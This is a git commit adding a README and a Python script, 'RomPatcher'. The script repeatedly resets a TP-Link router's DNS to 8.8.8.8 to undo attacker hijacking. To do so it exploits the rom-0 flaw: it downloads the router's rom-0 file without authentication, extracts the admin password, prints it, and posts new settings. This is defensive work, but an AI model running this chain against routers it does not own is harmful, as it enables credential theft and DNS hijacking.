71f95b77f58059b1fdb60f409ce3812cfd4a83ea
Mohammed Gad <mohammedgad7@gmail.com>
2016-11-04 20:28:59 +0200

    RomPatcher init

--- README.md
+++ README.md
@@ -1,1 +1,25 @@
-# RomPatcher
+#TP-Link Rom-0 Patcher
+
+TP-Link Rom-0 Patcher is a python script that keep changing your router's DNS to Google Public DNS every 15 minutes through a loop of three steps
+
+1. Download Rom-0 file 
+2. Extract router's password from Rom-0 file using rom-0 PasswordExtractor [View Source Code](https://github.com/rootkick/Rom-0-Decoder)
+3. Make a POST request to change the Primary and Secondary DNS to Google Public DNS 8.8.8.8
+4. GOTO Step 1
+
+#Why to use TP-Link Rom-0 Patcher
+
+TP-Link didn't release any updates or patch till now regards rom-0 vulnerability and all our tries to patch this vulnerability led to nothing which put a lot of people at risk and there are many attackers Exploit Rom-0 Vulnerability 
+and updates our router's DNS to their Server IP using automated server so you need to check your DNS every 15 minutes to make sure that you are safe from their attacks
+here comes **RomPatcher** role which change the DNS to Google Public DNS every 15 minutes so you don't need to keep track of your DNS
+
+#How to use TP-Link Rom-0 Patcher
+
+Make sure that you have python 2.7 
+`python --version`
+
+You can run RomPatcher script simply
+`python rompatcher.py`
+
+You can run RomPatcher script in background using
+`pythonw rompatcher.py`
---
+++ rompatcher.py
@@ -0,0 +1,68 @@
+import sys
+import urllib
+import urllib2
+import subprocess
+import base64
+import threading
+import time
+import os
+
+#Timer
+def RomPatcher():
+    timeinterval = 15*60
+    threading.Timer(timeinterval, RomPatcher).start()
+    print "Changing DNS to 8.8.8.8"
+    #Execute POST Request
+    try:
+        #Download Rom-0 and Extract Password
+        rom0file = urllib2.urlopen("http://192.168.1.1/rom-0")
+        with open('rom0','wb') as output:
+          output.write(rom0file.read())
+
+        if os.name == 'nt':
+            proc=subprocess.Popen("PasswordExtractor rom0",  stdout=subprocess.PIPE, shell=True)  
+        elif os.name == 'posix':
+            proc=subprocess.Popen("./PasswordExtractor rom0",  stdout=subprocess.PIPE, shell=True)
+            
+        rom0password = proc.stdout.read()
+
+        #POST request data and headers
+        username= "admin"
+        password=rom0password
+        print("Current password: %s" % rom0password)
+        base64string = base64.encodestring('%s:%s' % (username, password)).replace('\n', '')
+        
+        values = {'uiViewIPAddr': '192.168.1.1',
+                  'dhcpFlag': '0',
+                  'ipAddrMain': '192.168.1.1',
+                  'uiViewNetMask': '=255.255.255.0',
+                  'lan_RIPVersion': 'RIP1',
+                  'lan_RIPDirection': 'Both',
+                  'lan_IGMP': 'Disabled',
+                  'igmp_snoop_act': '0',
+                  'dhcpTypeRadio': '1',
+                  'dhcp_StartIP': '192.168.1.2',
+                  'sysPoolCount': '200',
+                  'dhcp_LeaseTime': '259200',
+                  'ST_IPAddr_Select': '00000000',
+                  'ST_MACAddr': '',
+                  'ST_MACAddr_Select': '00000004',
+                  'ST_MACChangeFlag': '1',
+                  'ST_Count': '4',
+                  'ST_Status_Select': 'Static',
+                  'uiViewDNSRelay': 'Use User Discovered DNS Server Only',
+                  'uiViewDns1Mark': '8.8.8.8',
+                  'uiViewDns2Mark': '8.8.8.8' }
+        headers = { 'Authorization': 'Basic %s' % base64string, 
+                    'Content-Type':'application/x-www-form-urlencoded'}
+        data = urllib.urlencode(values)
+        #Change DNS Request
+        req = urllib2.Request('http://192.168.1.1/Forms/home_lan_1',data, headers)
+        response = urllib2.urlopen(req)
+        if response.getcode() == 200:
+            print "DNS Changed."
+    except:
+        print "Unexpected error:", sys.exc_info()[0]
+    print time.strftime("%I:%M:%S")
+    
+RomPatcher()
